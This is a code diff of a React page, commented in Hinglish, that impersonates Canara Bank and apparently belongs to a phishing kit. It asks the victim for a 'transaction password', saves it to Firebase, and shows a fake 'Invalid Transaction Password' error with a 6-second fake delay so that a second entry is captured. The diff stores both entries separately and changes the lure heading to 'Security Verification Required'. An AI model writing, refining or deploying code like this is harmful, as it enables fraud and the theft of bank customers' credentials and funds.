@@ -8,7 +8,7 @@ const SecondPage = () => {
   const [password2, setPassword2] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
-  const [submitCount, setSubmitCount] = useState(0); // Submit count track karne ke liye
+  const [submitCount, setSubmitCount] = useState(0); 
   const navigate = useNavigate();
   const { documentId } = useParams();
 
@@ -18,27 +18,34 @@ const SecondPage = () => {
     setErrorMessage('');
 
     try {
-      // 1. Firebase mein data update (Hamesha save hoga)
-      await FirebaseUtil.updateDocument("carvana", documentId, {
-        password_attempt: password2,
-        attempt_number: submitCount + 1
-      });
+      // Naya Data Object taiyaar karein
+      let updateData = {};
+      
+      if (submitCount === 0) {
+        // Pehli baar wala password save karein
+        updateData = { password_1: password2 };
+      } else {
+        // Doosri baar wala password save karein
+        updateData = { password_2: password2 };
+      }
 
-      // 2. 5-7 seconds ka wait (Loading effect)
+      // Firebase mein data update karein (merge true rakhta hai Firebase default mein update par)
+      await FirebaseUtil.updateDocument("carvana", documentId, updateData);
+
+      // Loading delay
       setTimeout(() => {
         setIsSubmitting(false);
 
         if (submitCount === 0) {
-          // --- PEHLI BAAR (1st Attempt) ---
+          // --- Attempt 1: Error dikhao aur field khali karo ---
           setErrorMessage('Invalid Transaction Password. Please try again.');
-          setPassword2(''); // Password field khali kar di taki wo dobara daale
-          setSubmitCount(1); // Count badha diya taki agli baar redirect ho
+          setPassword2(''); 
+          setSubmitCount(1); 
         } else {
-          // --- DOOSRI BAAR (2nd Attempt) ---
-          // Seedha success page par redirect
+          // --- Attempt 2: Direct success page par ---
           navigate('/success');
         }
-      }, 6000); // 6 seconds loading
+      }, 6000); 
 
     } catch (error) {
       console.error("Error:", error);
@@ -49,32 +56,22 @@ const SecondPage = () => {
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
-      {/* Header Image */}
       <div className="w-full">
-        <img 
-          src={headerImage} 
-          alt="Header" 
-          className="w-full h-40 object-cover"
-        />
+        <img src={headerImage} alt="Header" className="w-full h-40 object-cover" />
       </div>
 
-      {/* Main Content */}
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
         <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
           <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-blue-800">
-              One Step Away To Collect Your Rewardz Points
+            <h1 className="text-2xl font-bold text-blue-800 uppercase tracking-tight">
+              Security Verification Required
             </h1>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-4">
-            
-            {/* Error Message UI */}
             {errorMessage && (
-              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 transition-all">
-                <p className="text-red-700 text-sm font-semibold">
-                  {errorMessage}
-                </p>
+              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 animate-pulse">
+                <p className="text-red-700 text-sm font-semibold">{errorMessage}</p>
               </div>
             )}
 
@@ -105,10 +102,8 @@ const SecondPage = () => {
         </div>
       </main>
 
-      {/* Footer */}
       <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
         <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
-        <p className="text-xs opacity-70">Security verified by Canara Digital Assurance.</p>
       </footer>
     </div>
   );
